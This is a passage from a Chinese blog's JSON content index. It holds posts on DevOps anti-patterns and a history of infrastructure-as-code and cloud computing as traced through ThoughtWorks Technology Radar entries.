教条主义\u0026quot;和\u0026quot;DevOps模仿者\u0026quot;反模式。\n反模式：DevOps 教条主义 ( DevOps dogmatism ) #反模式名称：DevOps 教条主义（DevOps dogmatism）\n反模式类别： 策略反模式\n不良后果： 无法达到 DevOps 改进预期的效果\n常见原因：\n认为 DevOps 是静态，完整的理论体系。 认为体系化的 DevOps 资料，例如：文献、书籍可以覆盖所有 DevOps 内容。 说明：\nDevOps 的目标是\u0026quot;通过一系列行之有效的管理实践和技术实践，以消除软件全生命周期的中的浪费，提升软件及其过程的质量、效率和反馈频率。从而使组织能够更好的适应外部的变化。\u0026quot;\n在此基础上，DevOps 相关的实践和模式是不断随着组织上下文和技术上下文的发展而发展的。\n注意，**“DevOps 教条主义”反模式可能会导致“DevOps 复制者”反模式。但“DevOps 复制者”反模式并不一定会导致\u0026ldquo;DevOps 教条主义\u0026rdquo;反模式。“DevOps 教条主义”**反模式的关键在于 DevOps 定义和实践是不继续发展的。而 **“DevOps 复制者”**反模式的关键在于 DevOps 不需要根据组织进行定制。\n修正模式：定义你的 DevOps，DevOps 度量\n相关反模式：DevOps 复制者\n相关引用：\nhttp://www.jedi.be/blog/2012/05/12/codifying-devops-area-practices\n反模式：DevOps 复制者 (DevOps Copycats) #反模式名称：DevOps 复制者 (DevOps Copycats)\n反模式别名：无\n反模式类别： 策略反模式\n不良后果： 完全复制别人的 DevOps 实践做法，而不进行分析和定制化。导致无法达到 DevOps 转型或者改进的效果。\n常见原因：\n简单的复制成功企业的经验，而没有分析成功的上下文。 成功的案例很少会展示失败的部分。 没有度量机制进行改进。 说明：\n在同一行业内发现成功案例会很容易错误的以为案例可以复制。缺乏对案例成功的上下文分析会导致同样的实践产生了不同的效果。因此，有必要分析自身的上下文和成功案例上下文的区别，或者进行试点以总结经验。以便更好的定制化 DevOps 实践。任何外部的实践都只具备参考意义。\n对外部案例的尝试不算是 DevOps 复制者。DevOps 复制者的关键在于尝试后没有进行回顾复盘并不进行改变。\n注意，**“DevOps 教条主义”**反模式可能会导致 **“DevOps 复制者”**反模式。但 **“DevOps 复制者”**反模式并不一定会导致 **\u0026ldquo;DevOps 教条主义\u0026rdquo;反模式。“DevOps 教条主义”**反模式的关键在于 DevOps 定义和实践是不继续发展的。而 **“DevOps 复制者”**反模式的关键在于 DevOps 不需要根据组织进行定制。\n修正模式：定义你的 DevOps，DevOps 度量\n相关模式：和该模式相关的其它模式，其它模式也会导致同样的反模式。\n相关反模式：DevOps 教条主义\n相关引用：相关资料的引用。\n关于 DevOps 模式 #DevOps 模式的索引在 Github 上开源，地址是 https://github.com/wizardbyron/devops_patterns\n欢迎通过 issue 和pull request 提交你的建议。\n你可以通过关注我的公众号了解 DevOps 模式和反模式，也可以加入我的付费知识星球“DevOps 模式” 和所有 DevOps 的实践者共同交流，我将在知识星球中定期回答那些最受关注的问题。\n","date":"May 26, 2019","permalink":"/blog/2019/2019-05-26-devops-pattern-define-your-devops/","section":"Blogs","summary":"","title":"DevOps 模式 - 定义你的DevOps"},{"content":" 本文原文发表于 2019 年 5 月 21 日的 ThoughtWorks 洞见，后经过修改发表到博客上。\n在上一篇文章中，我们讲到了DevOps 和持续交付的关系。本篇将回顾最先改变运维工作的相关技术 —— 基础设施即代码和云计算，通过技术雷达上相关条目的变动来跟踪其趋势变化。\n基础设施即代码 #和持续交付一样，基础设施即代码（Infrastructure as code）这项技术第一次在技术雷达出现就被纳入到了“采纳”环。\n十年前，云计算的普及程度远不如当今。很多企业开始采用虚拟化技术（严格的说，那时候还不能称作是云）来解决资源不足和设备异构的问题。简单的说，你可以接虚拟化技术是在异构的设备上构建了一个通用适配层。使得各种不同的应用程序和设备能够通过通用的操作进行统一的管理，那时候面临这样问题多是通信、银行、政府、石油等关键领域。即便 IBM，Oracle，EMC 微软等都有“整体解决方案”，但为了避免供应商绑定风险，政府还是希望能够“混搭”：通过做大蛋糕来降低风险。当然，这种做法也降低了效率。然而当虚拟化技术解决了异构问题之后，基础设施资源被抽象为网络、计算、存储三类资源。由于业务的异构性，企业级领域迟迟没有解决方案。毕竟为了让虚拟化的资源能够尽快产出价值，往虚拟资源的迁移工作相关的集成工作占据了工作主要内容。\n于是运维工程师和网络工程师慢慢远离机房，和系统工程师以及数据库工程师坐在了一起，共同成为了“脚本工程师”。\n此时，Linux 开始通过 Xen 和 KVM 侵蚀传统 UNIX 厂商的市场份额。SCO，AIX 和 HP-UX 这些过去按卖 License 获得售后服务的方式毕竟太贵了。可以说，借由 Linux 虚拟化技术的云计算技术给商业 UNIX 来了一记补刀，如今你很少能看到这些商业 UNIX 了。\n虚拟化技术把所有的空闲资源收集到了一起，这些资源完全可以在不增加基础设施设备投入的情况下运行更多的应用程序。拟化技术还可以通过整合小型设备，得到和大型设备一样的表现。\n但是，如果你通过虚拟化节约出来的空闲资源你使用不了，但是还要收取电费，这就是很大的浪费。于是有些人则想到了把这些空闲的资源租出去，变成一个单独的业务。这就是另外一个故事了，我们稍后会提到。\n随着 VMware，Oracle，Cisco，IBM 推出了各自的解决方案，“脚本工程师”们开始考虑如何管理大量的空闲资源。随着敏捷软件开发逐渐成为主流，基础设施的变更效率显然满足不了敏捷的迭代速度。基础设施的变更带来的风险和周期远远大于应用。如何让基础设施敏捷起来，成为了敏捷软件开发在交付最后一公里需要迫切解决的问题。\n这时候，由于规模和复杂度都很大，脚本工程师们考虑的第一个问题就是：如果规模没办法改变，我们就降低复杂度吧。\nPuppet 和 Chef 的短暂辉煌 #Puppet 是第一个嗅到这个商机的工具，它在第2010年8月的技术雷达上出现在了“试验”环里。\nRuby 很适合构建领域特定语言（DSL），继 Cucumber 在这方面的成功探索后，脚本工程师们希望通过 DSL 缩小 Dev 和 Ops 之间的差距。作为同一时期的竞争者，Chef 以对开发人员更加友好的方式出现。Chef 相比 Puppet 更有竞争力的一点就是对于 Windows 的支持。\n不过，由于缺乏最佳实践，Puppet 和 Chef 很快就被玩坏了，复杂性的治理难度超过预期。随着治理规模的扩大，Puppet 和 Chef 带来的负面效应逐渐显现。曾经有人这样讽刺 Puppet：\nPuppet 就像蟑螂。当你刚开始用了 Puppet，慢慢的你会发现你的代码库里到处都是 Puppet。\n此外，事实证明 Ruby 是一个便于开发，但是难于维护的语言。Ruby 及其社区的频繁发布和不兼容特性使得后期接手维护的脚本工程师们叫苦不迭，加之 Ruby 工程师的招聘成本和培训成本都更高。即便 Ruby 的 Puppet 和 Chef 工具学习曲线比较平缓，但遗留的基础设施即代码的学习曲线却非常陡峭。基础设施的变更风险很大，且缺乏必要的质量实践，特别是主从模式的中心化还带来了单点故障和复杂度，这些都使得基础设施代码越来越难以维护。\n在敏捷团队中，去中心化、自治的团队往往是被提倡的。于是 Puppet 推出了 standalone 模式，Chef 出现了 chef-solo 这样去中心化的特性。技术雷达很快就出现了与之相对的Librarian-puppet and Librarian-Chef 和 Masterless Chef/Puppet这样去中心化的实践。\n于是，大家把聚光灯从 Ruby 转向了 Python。从中心化转向了去中心化。然而，当“无状态服务器” 出现在2012 年 10月的技术雷达的“采纳”区域时，新的基础设施即代码管理思想也应运而生。\n从菜谱（Cookbook）到剧本（Playbook）—— Ansible #在 Puppet 和 Chef 的最佳实践并没有创造出新的市场份额，而是给它们创造了一个新对手——Ansible。Ansible 在 2014 年 1 月首次出现在了技术雷达的 “试验” 区域，短短半年后就在 2014年 7月的技术雷达中出现在了 “采纳” 区域。\nAnsible 采用了 Python + Yaml 这种 Python 社区常见的组合。用 Yaml 作为 Playbook 的格式来存储虚拟机的配置。通过把虚拟机抽象成状态机，在 Playbook 中版本化保存状态的方式使得基础设施即代码的“状态”和“状态变更”的分离更加彻底，大大减少了代码量和编程量。甚至坊间有人笑称 Ansible 把运维工程师从脚本工程师变成了配置管理工程师，基础设施即代码变成了基础设施即配置。\n面向云计算的基础设施即代码 #基础设施即代码的技术最早不是为云计算设计的。但随着云计算的广泛应用，脚本工程师对于“看不见的机房”的管理就只剩下编程了。然而，面向于传统机房和 IaaS 的基础设施即代码技术在PaaS 盛行的今天却有点捉襟见肘，云平台自己的 CLI 工具是为管理员设计的，而不是为开发者设计的。此外，尽管 Puppet，Chef 和 Ansible 各自都增添了对云计算更友好的功能，但本质上是面向虚拟机而非云计算平台设计的。对云计算平台的操作仍然需要通过构建一个 Agent 的方式处理。\n这些诉求推动了面向云平台的技术设施即代码工具的出现。最先为大众所熟知的就是 Terraform。\n“Hashi 出品，必属精品”，HashiCrop 就像 DevOps 界的暴雪娱乐。在云计算和 DevOps 的领域里，HashiCrop的每一款产品都进入了技术雷达，并引领了接下来几年 DevOps 技术的发展。\n在虚拟化技术刚刚成熟的时候，HashiCrop 就推出了 Vagrant。Vagrant 于 2011 年 1 月出现在技术雷达的 “评估” 区域，2012 年进入了 “试验” 区域。\n随之在技术雷达上就出现了对开发工作站的基础设施自动化的实践。随着 Packer 在 2014 年 6 月 进入技术雷达“采纳”区域的同时，镜像构建流水线也出现在了技术雷达上。\nVagrant 和 Packer 这样的组合深深影响了 Docker，这个我们后面再说。我们还是回过头来说说 Terraform。2015 年，Terraform 出现在了技术雷达的 “评估” 区域上。技术雷达是这么描述的：\n使用 terraform, 可以通过编写声明性定义来管理云基础架构。由 terraform 实例化的服务器的配置通常留给 Puppet, Chef 或 Ansible 等工具。我们喜欢 terraform, 因为它的文件的语法可读性比较高, 它支持多个云提供商, 同时不试图在这些提供商之间提供人为的抽象。在这个阶段, terraform 是新的, 并不是所有的东西都得到了实施。我们还发现它的状态管理是脆弱的, 往往需要尴尬的体力工作来解决。\n虽然 Terraform 有一些问题，但瑕不掩瑜。HashiCrop 改进了 Terraform。一年之后，在 2016 年 11 月的技术雷达中，Terraform 进入了 “试验” 区域。这些改进也被技术雷达敏锐的捕捉到：\n在我们近两年前首次更谨慎地提到 terraform 之后, 它得到了持续的发展, 并已发展成为一个稳定的产品, 已经证明了它在我们项目中的价值。现在, 通过使用 terraform 所说的 “远程状态后端”, 可以回避状态文件管理的问题。\n为了避免重蹈 Puppet 和 Chef 被玩坏的覆辙，Terraform 总结了最佳实践并发布了 Terraform: Up and Running 一书。随之推出了与之对应的工具Terragrunt，Terragrunt 于 2018 年 11 月出现在了技术雷达，它包含了之前介绍过的“基础设施流水线”的思想。\n基础设施即代码的自动化测试 #可测试性和自动化测试永远是技术雷达不可缺少的话题，基础设施即代码也是一样。在提出基础设施的可测试性诉求后，Provisioning Testing应运而生，它的目的在于对服务器初始化正确性的验证，被纳入到了 2014 年 1 月技术雷达的 “试验” 区域。Puppet 和 Chef 分别有了 rspec-puppet 和 kitchen 作为各自的测试框架来支持这种实践。\n但当基础设施即代码采用不止一种工具的时候，采用各自的测试套件就比较困难了。因此，寻找与基础设施即代码无关的测试工具就非常必要，毕竟 Chef，Puppet 和 Ansible 都只是一种实现方式，而不是结果。\n采用 Ruby 编写的 Serverspec 出现在了 2016 年 11 月技术雷达的 “试验” 区域。半年后，采用 Python 写的Testinfra 也出现在了 2017 年 6 月技术雷达的 “试验” 区域。它们都可以通过工具无关的描述方式来验证基础设施的正确性。\n有了自动化测试工具，我们就可以采用 TDD 的方式开发基础设施。先用代码来描述服务器的规格，然后通过本地或远程的方式进行验证。此外，这样的自动化测试可以被当做一种监控，集成在流水线中定时运行。\n下面是基础设施即代码相关条目的发展历程一览图。实线为同一条目变动，虚线为相关不同条目变动：\n相关条目：Puppet，Librarian-puppet and Librarian-Chef，Masterless Chef/Puppet，Provisioning Testing，Testinfra，Serverspec，Terraform，Terragrunt。\n揭开云计算的大幕 #咱们接着说“有人想把虚拟化后的空闲资源变成一个独立的业务”这件事。彼时，网格计算和云计算的口水战愈演愈烈，大家似乎没有看出来IDC（Internet Data Center）机房里托管虚拟机和云计算之间太多的差别，云计算听起来只是一个营销上的噱头。\n2010 年第一期的技术雷达上，云计算就处在了 “采纳” 区域，技术雷达是这么描述云计算的：\nGoogle Cloud Platform Amazon EC2 和 salesforce. com 都声称自己是云提供商, 但他们的每个产品都有所不同。云适用于服务产品的广泛分类, 分为基础架构即服务 (例如 Amazon EC2 和 Rackspace)、平台即服务 (如Google App Engine) 和软件即服务 (如 salesforce. com)。在某些情况下, 提供商可能跨越多个服务类别, 进一步稀释云作为标签。无论如何, 云中基础设施、平台和软件的价值是毋庸置疑的, 尽管许多产品在路上遇到了坎坷, 但他们肯定已经赢得了自己在雷达上的地位。\n那时的 IaaS、PaaS 和 SaaS 都可以被称之为云计算，只不过每个供应商的能力不同。而它们的共同点都是通过 API 提供服务。\n到了2010年4月的第二期技术雷达，技术雷达则把 SaaS 看作是云计算的最高级成熟度。而 IaaS 和 PaaS 是不同阶段的成熟度。并把原先的云计算拆分成了三个条目：EC2\u0026amp;S3 （来自 AWS），Google Cloud Platform，Azure。并且分别放在 “试验”、“评估”、“暂缓” 象限。也就是说，在 2010年，ThoughtWorks 一定会用 AWS，有些情况下会考虑 GCP，基本不会考虑使用 Azure。\n而公有云计算供应商的三国演义就此展开。\nAWS 一马当先 #多年以来 AWS 上的服务一直引领者云计算的发展，成为众多云计算供应商的效仿对象，也成为了多数企业云计算供应商的首选。虽然 AWS 正式出现在技术雷达是在 2011 年 7 月，然而 EC2 \u0026amp; S3 的组合在第二期就出现在技术雷达的 “试验” 区域了。在 Docker 出现的第二年，AWS 就出现了托管的弹性容器服务 ECS (Elastic Container Service)，也是第一家在云计算平台上集成 Docker 的供应商。为了解决大量不同品牌移动设备测试的问题推出了 AWS Device Farm，使得可以通过在线的方式模拟数千种移动设备。在微服务架构流行的年代，不光推出了第二代容器基础设施 AWS Fargate 和 7层负载均衡 Application LoadBalancer。更是先声夺人，率先提供了基于 Lambda 的函数即服务（Function As A Service）无服务器（Serverless）计算架构，使得开发和部署应用变得更加灵活、稳定和高效。\n然而，随着成熟的云平台的选择增多。AWS 不再是默认的选择，在2018 年 11 月的技术雷达中， AWS 从 “采纳” 落到了第 “试验” 区域。但这并不是说明 AWS 不行了，而是其它的公有云供应商的技术能力在不断追赶中提升了。这就意味从 2018 年开始， AWS 并不一定是最佳选择。Google Cloud Platform 和 Azure 可能会根据场景不同，成为不同场景的首选。\nGCP 紧随其后 #开发人员最不想面对的就是基础设施的细节。它们希望应用程序经过简单的配置可以直接在互联网上运行。而无需关注网络、操作系统、虚拟机等实现细节——这些细节对开发者应该是透明的。\nGoogle App Engine 最早就以云计算的概念出现在技术雷达上的 “评估” 象限，存在了两期后便消失不见。在那个时代，人们对于无法控制基础设施细节的云计算平台还是心存怀疑。更重要的是，按照新的编程模型修改现有应用架构的成本远远大于基于 IaaS 平台的平行移动成本。前者需要重构整个应用，后者几乎可以无缝对接。\n然而，新时代的容器技术和 SaaS 应用让 Google 笑到了最后。基于 Kubernetes 的容器编排技术几乎成为了行业标准。Google Cloud Platform 适时推出了自己的 Kubernetes 平台服务GKE – Google Kubernetes Engine，使得 Google Cloud Platform 重回技术雷达的视野，在 2017 年 11 月的技术雷达，Google Cloud Platform 进入了 “尝试” 象限。技术雷达是这么描述的：\n随着GOOGLE CLOUD PLATFORM(GCP)在可用地理区域和服务成熟度方面的扩展，全球的客户在规划云技术策略时可以认真考虑这个平台了。与其主要竞争对手Amazon Web Services相比，在某些领域， GCP 所具备的功能已经能与之相媲美。而在其他领域又不失特色——尤其是在可访问的机器学习平台、数据工程工具和可行的 “Kubernetes 即服务解决方案”(GKE)这些方面。在实践中，我们的团队对GCP工具和API良好的开发者体验也赞赏有嘉。\n即便 AWS 也推出了对应的 Kubernetes 服务 EKS (Amazon Elastic Container Service for Kubernetes，别问我为什么不是 ECSK，官方网站上就这么写的)，但也无法撼动其领先位置。随着更多的企业已经接受容器化技术，并通过 Kubernetes 在私有云中进行编排以实现 DevOps。通过 GKE 实现云迁移成本降低了很多。\nAzure 后来居上 #Azure 在 2010 年的第二期技术雷达被放到了”暂缓”区域。意思就是在考虑云计算平台的时候，就不要考虑用 Azure 了。尽管如此，Azure并没有因为被边缘化就逡巡不前。经过了 7 年， Azure 伴随着一系列激动人心的新产品重回人们的视野。然而，从 2017 年底开始，Azure 的服务开始进入技术雷达的 “评估” 区域。首先进入技术雷达的是 Azure Service Fabric：\nAZURE SERVICE FABRIC是为微服务和容器打造的分布式系统平台。它不仅可以与诸如Kubernetes之类的容器编排工具相媲美，还可以支持老式的服务。它的使用方式花样繁多，既可以支持用指定编程语言编写的简单服务，也可以支持 Docker 容器，还可以支持基于 SDK 开发的各种服务。自几年之前发布以来，它不断增加更多功能，包括提供对Linux 容器的支持。尽管 Kubernetes 已成为容器编排工具的主角，但 Service Fabric 可以作为 .NET 应用程序的首选。\n而后到了 2018 年，Azure 的后发优势不断在技术雷达中涌现出来，除了 Azure 进入了 “试验” 以外，就是 Azure Stack 和 Azure DevOps 两个产品了。技术雷达在 2018 年 5月是这么描述 Azure Stack 的：\n通过 AZURE STACK，微软在全功能的公有云和简单的本地虚拟化之间提供了一个有意思的产品:一个运行Microsoft Azure Global云的精简版本软件。该软件可以安装在诸如惠普和联想这样的预配置通用商品硬件上，从而让企业在本地获得核心的 Azure 体验。默认情况下，Microsoft 和硬件供应商所提供的技术支持是彼此分离的(他们承诺要相互合作)，但系统集成商也能提供完整的 Azure Stack 解决方案。\n在我看来，Azure Stack 就是云时代的 Windows。相较于以前硬件厂商受制于 Windows 的各种设备而言，未来的虚拟设备厂商也会受制于 Azure Stack。这时候 Azure Stack 不单单是一套私有云了，它更是未来硬件厂商的渠道。虽然在私有云领域中有很多的选择，但在使用体验上，微软的产品正在超过其它竞争者。\n另外一个强烈推荐的服务就是 Azure DevOps。DevOps 运动发展以来，不断有公司在开发 DevOps 平台这样的产品，希望能够通过产品巩固自己在 DevOps 领域的话语权。也有很多做 DevOps 的企业通过集成不同的工具来构建自己的 DevOps 平台。目的是将计算资源和开发流程采用工具整合起来，形成一套由工具构建的工作流程和制度。并采用逆康威定律——用系统结构反向改变组织结构，从而达到 DevOps 技术和管理的双转型。\n但很少有产品能够跨越足够长的流程来做到管理，这也导致了 DevOps 平台由于范围的限制引起的不充分的转型。而Azure DevOps 提供了完整的产品端到端解决方案，Azure DevOps 的前身是微软 VSTS，也有基于企业的 TFS 产品可供选择。它涵盖了产品管理，任务看板，持续交付流水线等服务，这些服务也同时可以和 Azure 其它服务有机结合。并且可以和 Visual Studio 完美集成。真正解决从需求编写到上线发布中间每一个活动的管理。你还可以构建仪表盘，用各个活动中的数据来自动化度量 DevOps 的效果。\n私有云——从 IaaS，PaaS 到 CaaS #公有云和私有云似乎是在两个世界。很久以来，私有云算不算”云”也存在争议。甚至有人把私有云称之为”企业虚拟化 2.0″。但直到多个公有云上的实践和工具同时能够兼容企业的私有虚拟化平台，私有云的概念才真正建立起来。这就是为什么私有云在技术雷达上出现的时间要比 OpenStack 这样的虚拟化工具更晚。OpenStack 在 2010 年第二期技术雷达就出现了，而私有云要到 2 年后，也就是 2012 年，才出现在技术雷达上。\nOpenStack是由NASA（美国国家航空航天局）和Rackspace合作研发并发起的，以Apache许可证授权的自由软件和开放源代码项目。OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，每个服务提供API以进行集成。\n虽然 OpenStack 出现在技术雷达上比较早，但直到2013年5月，也就是 3年后，才进入到 “试验” 区域。即便有很多企业用于生产环境，技术雷达的编写者仍然很慎重的选择这样的开源产品。毕竟，可能造成的影响越大，就越要小心。\n在众多大型厂商的私有云和虚拟化平台中，OpenStack 因为其开源的免费，并且有 NASA 和 Rackspace 做背书。成为了很多企业构建私有云的首选。然而，构建一套基于 OpenStack 的 IaaS 基础设施到真正能够帮助开发人员提升效率是需要花费很大成本的。随着 OpenStack 的影响力不断扩大，用户需要的技术支持服务也慢慢成为了一个新兴的市场。甚至于有企业将基于 OpenStack 开发自己的私有云产品以提供对外服务。\n然而，彼时的 OpenStack 在开发者体验上并没有什么优势。不过由于 OpenStack 是基于 Python 开发的，OpenStack 的流行可以说是促进了 Python 的大规模推广。( Python 的第二次大规模推广是大数据和人工智能，如果想问的话。)这使得一批基于 DevOps 理念的 PaaS 平台崛起，最先为人所知首当其冲的就是 Pivotal 的 CloudFoundry。由于 Pivotal 是一个商业组织，他更关心客户的痛点，为此构建了很多解决方案。甚至将 CloudFoundry 自身部署在 OpenStack 上，使得 OpenStack 看起来不是那么的难用。\n自2012年我们上次提及 CloudFoundry 以来, PaaS 空间发生了许多变化。虽然开源核心有各种分布, 但作为 Pivotal Cloud Foundry公司组装的产品和生态系统给我们留下了深刻的印象。虽然我们期望非结构化方法 (Docker、Mesos、Kubernetes 等) 与 Cloud Foundry 和其他公司提供的结构更结构化、更固执己见的构建包样式之间继续保持趋同, 但我们认为, 对于愿意这样做的组织来说, 我们看到了真正的好处。接受采用 PaaS 的约束和演化速度。特别令人感兴趣的是开发团队和平台操作之间交互的简化和标准化所带来的开发速度。\n不过，正在 IaaS 和 PaaS 正在讨论谁更适合做 SaaS 平台的时候。Docker 的出现成为了云计算市场和 DevOps 领域的另一个标志性事件。使得无论是公有云产品还是私有云产品，IaaS 产品还是 PaaS 产品。都不约而同的开始了对 Docker 的支持。并且有人认为 Docker 会是云计算的下一个里程碑和战场。正如上文介绍的那样，AWS 推出了 ECS，Google 推出了 GKS，Azure 也推出了自己的容器服务。同时也有不少的创业公司提出了 “容器即服务”(Container as a Service)的概念，企图从云计算市场上分得一杯羹。关于 Docker 和容器平台，我们会放在下一篇详细讲。\n混合云（HybirdCloud） #和私有云同时出现在了 2012 年 4 月的技术雷达上，但是是在 “评估” 区域。彼时，混合云只是为了在资源不足时对私有云进行临时扩展：\n混合云描述了一组结合公共云和私有数据中心的最佳功能的模式。它们允许应用程序在正常时段在私有数据中心运行, 然后在公有云中使用租用的空间, 以便在交通高峰期实现溢出容量。以敏捷的方式组合公共云和私有云的另一种方法是使用公共云的弹性和可塑性来开发和了解应用程序的生产特征, 然后将其移动到私有数据中的永久基础结构中中心时, 它是稳定的。\n在体会了公有云”真香”之后，大多数企业都回不去了。然而，种种限制还是阻碍了企业从私有云向公有云迁移的进度。不过，这种情况下促生了混合云的生意。不光公有云供应商提供了自己的服务，很多创业公司也加入进来。于是技术雷达在半年后更新了混合云：\n混合云结合了公有云和私有数据中心的最佳功能。它们允许应用程序在正常时段在私人数据中心运行, 然后在公共云中使用租用的空间, 以便在交通高峰期实现溢出容量。现在有许多基础架构解决方案允许跨混合云 (如 Palette 和 Rrightscale) 进行自动和一致的部署。借助来自亚马逊、Rackspace 和其他公司的强大产品, 我们正在将混合云转移到此版本的雷达上的 ““尝试”” 区域。\n从另外一个角度说，公有云的技术发展速度和成本是远高于私有云的。这也是集中化投资的优势，减少研发和协调上的浪费。当企业开始结合公有云和私有云之后，就会慢慢发现公有云带来的成本和技术优势。私有云和数据中心就会被公有云逐渐取代。\n多云（PolyCloud）共用时代 #多云不同于混合云，混合云指的是私有云和公有云之间的混合使用。多云指的是不同的公有云供应商之间的混合使用。在三大公有云供应商共同相聚在 2018 年 11 月的 “试验” 之前。多云的趋势就在 1 年之前进入了技术雷达的 “评估” 区域：\n主要的云提供商 (亚马逊、微软和谷歌) 陷入了一场激烈的竞争, 以保持核心功能的平价, 而他们的产品只受到轻微的区分。这导致少数组织采用 Polycloud 战略, 而不是与一个提供商 “All-in”, 而是以最佳的方式将不同类型的工作负载传递给不同的提供商。例如, 这可能涉及将标准服务放在 AWS 上, 但使用 Google 进行机器学习, 将 Azure 用于使用 SQLServer 的. net 应用程序, 或者可能使用 Ethereum 联盟区块链解决方案。这不同于以供应商之间的可移植性为目标的云无关策略, 这种策略成本高昂, 并迫使人们采取最小公约数思维。而多云则专注于使用每个云提供的最佳产品。\n然而，短短半年，多云就进入了 “试验” 区域。与其说技术雷达推荐，倒不如说是两方面大势所趋：一方面，企业在采用混合云之后会想要跟多的云服务。另一方面，公有云供应商之间的产品同质性迫使它们要发挥自己的特色。此外，如果其中一个云供应商出了问题，我们还有其它的供应商可用。这就引发了一个新问题：企业不想自己被供应商绑定。于是就有了 “泛化云用法”（Generic cloud usage，我自己的翻译）这样不推荐的实践。它和多云一起出现在了 2017年的技术雷达和 “暂缓” 区域:\n主要云提供商继续以快速的速度向其云添加新功能, 在 Polycloud 的旗帜下, 我们建议并行使用多个云, 以便根据每个提供商的产品优势混合和匹配服务。我们越来越多地看到组织准备使用多个云–不过, 不是从个别供应商的优势中获益, 而是不惜一切代价避免供应商 “锁定”。当然, 这导致了泛化云用法, 只使用所有提供商都有的功能, 这让我们想起了10年前我们看到的最低公分母场景, 当时公司努力避免了关系数据库中的许多高级功能以保持供应商中立。锁定的问题是真实存在的。但是, 我们建议不要使用大锤方法来处理此问题, 而是从退出成本的角度看待此问题, 并将这些问题与使用特定于云的功能的好处相关联。\n然而，这种警告确实在早期很难引起注意。因为大规模的”通用云用法“导致的不良后果不会来的那么快。\n主要的云提供商在定价和发布新功能的快速速度方面的竞争力越来越强。这使得消费者在选择并承诺向提供者承诺时处于困难境地。越来越多的人看到, 我们看到组织准备使用 “任何云”, 并不惜一切代价避免供应商锁定。当然, 这会导致泛化云用法。我们看到组织将其对云的使用限制在所有云提供商中共有的功能, 从而忽略了提供商的独特优势。我们看到组织对自制的抽象层进行了大量投资, 这些抽象层过于复杂, 无法构建, 维护成本也太高, 无法保持云不可知论。锁定的问题是真实存在的。我们建议使用多云策略来解决此问题, 该策略根据使用特定于云的功能的好处, 评估从一个云到另一个云的迁移成本和功能的工作量。我们建议通过将应用程序作为广泛采用的 Docker 容器运输来提高工作负载的可移植性: 使用开源安全和身份协议轻松迁移工作负载的标识, 这是一种与风险相称的供应商策略, 以只有在必要的时候才能保持云的独立性, Polycloud 才能在有意义的情况下混合和匹配来自不同提供商的服务。简而言之, 请将您的方法从通用云使用转向明智的多云战略。\n下面是云计算相关条目的发展历程一览图。实线为同一条目变动，虚线为相关不同条目变动：\n当大规模的基础设施能够通过开发的方式管理起来以后。似乎运维工程师也变成了一类开发者——基础设施开发者。而和一般应用程序开发者的区别就是面向的领域和使用的工具不同。而基础设施即代码技术和云计算的结合使用可以大大降低基础设施的复杂度。于是我们就可以驾驭更加复杂的应用程序了，特别是微服务。请期待下一篇：从技术雷达看DevOps十年——容器和微服务。\n相关条目：AWS ECS，AWS Device Farm，AWS Lambda，AWS ECS，AWS Fargate，AWS Application Loadbalancer，Google App Engine，Google Cloud Platform，GKE，Azure，Azure Service Fabric，Azure Stack，Azure DevOps，Private Clouds，Hybird Clouds，PolyCloud，Generic Cloud Usage\n","date":"May 21, 2019","permalink":"/blog/2019/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/","section":"Blogs","summary":"","title":"从技术雷达看 DevOps 的十年——基础设施即代码与云计算"},{"content":"","date":null,"permalink":"/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/","section":"Tags","summary":"","title":"云计算"},{"content":"2018年的5月，DevOps 实践手册作者\u0026quot;四人帮\u0026quot;之一的 John Willis 来到了北京，在 DevOps 国际峰会上做了一场名为\u0026quot;DevOps：Almost 10 Years - What A Strange Long Trip It\u0026rsquo;s Been\u0026ldquo;的演讲。除了这个演讲的 PPT 只有一张很长的图片以外，坐在台下的我对他在这篇演讲中 DevOps 的定义有了共鸣。在这次演讲中，他将 DevOps 定义如下：\n翻译过来就是\u0026quot;DevOps 是一组实践和模式，用来将人力资本转化为高效能的组织资本\u0026rdquo; 。\n关于这段定义，我深以为然。\n然而，在不同的场合和其他人交流时，我对 DevOps 的实践产生了忧虑。一方面，我看到很多朋友在落地某些 DevOps 实践中，由于缺乏经验，出现了种种阻碍 DevOps 产生效益的问题。另一方面，尽管论述如何做 DevOps 的材料足够多。但几乎都是告诉我们\u0026quot;成功的 DevOps”是什么样的，而“出现了问题怎么办”的内容却乏善可陈。\n我发现很多问题在不同组织的 DevOps 转型中反复遇到，而解决这些问题的方式和碰到的问题也大同小异。因此，我开始把这些常见有效的做法和常见的错误做法总结下来，并采用模式的语言对其进行分类整理和描述，形成了 \u0026ldquo;DevOps 模式\u0026rdquo;。\n下面，我将这套 DevOps 模式语言的基本格式介绍给你。\nDevOps 模式类别 #DevOps 的模式分为以下五类：\n**策略模式：**在设计长期的 DevOps 改进中的方向。 **组织模式：**在不同类型、不同规模的组织下的团队分工合作方式。 **管理模式：**提升组织表现的日常工作的流程、活动和制度。 **技术模式：**服务于管理模式的工具及其实践。 **文化模式：**用于提升团队 DevOps 文化的一些活动和方法。 DevOps 模式的格式 #DevOps 模式的将采用下述格式描述：\n模式名称：用来描述模式的正式名称，这个名称描述了该模式的特征。\n模式别名：其它方便记忆的其它名称，别名一般包含了某种助记隐喻。\n模式类别： 策略模式、组织模式、管理模式、技术模式和文化模式的其中一种。\n风险： 采用该模式可能会带来的风险。风险包括以下三种：\n低 - 不用担心，放心采用。该模式没有特殊的场景和附加条件。 中 - 采用的时候要注意场景和条件，否则会出现反模式。 高 - 请在实践过 DevOps 的专家指导下采用，轻易采用会带来严重的后果。 **价值：**采用该 DevOps 模式的转型收益。转型收益包括以下三种：\n低： 采用该模式只会产生短期的收益。 中： 采用该模式产生中期固定的收益，但要持续做。 高： 采用该模式会对组织产生长期的收益。 **见效时间：**采用该 DevOps 模式的转型收益。转型收益包括以下三种：\n慢： 4 周内看不到显著改进。 普通： 2 - 4 周可看到显著改进。 快： 2 周内可看到显著改进。 说明： 对模式的描述和说明。以及产生的收益和风险。\n**相关模式：**和该模式相关的其它模式。\n相关反模式： 可能出现的常见错误做法和后果。\n**引用：**相关资料的引用。\nDevOps 的反模式 